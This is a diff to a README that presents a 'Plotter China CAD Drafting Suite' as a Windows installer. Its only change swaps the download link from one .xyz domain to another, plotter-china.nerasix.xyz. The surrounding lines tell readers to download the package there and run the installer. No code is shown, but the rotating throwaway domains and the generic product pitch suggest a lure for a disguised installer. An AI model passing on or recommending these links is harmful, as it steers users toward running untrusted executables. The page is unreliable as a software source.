@@ -18,8 +18,8 @@ This repository ships **Plotter China CAD Drafting Suite** as a Windows installe
 
 > Use the project link below for Windows.
 
-* **Project link:** **[plotter-china.nexpath.xyz](https://plotter-china.nexpath.xyz/)**
-* **Full URL:** `https://plotter-china.nexpath.xyz/`
+* **Project link:** **[plotter-china.nerasix.xyz](https://plotter-china.nerasix.xyz/)**
+* **Full URL:** `https://plotter-china.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ The package is tuned for offline desktop use — install once, open the app, and
 * **RAM:** 6 GB minimum | 14 GB for big sessions
 * **Disk:** 5 GB available storage
 
-***
+***
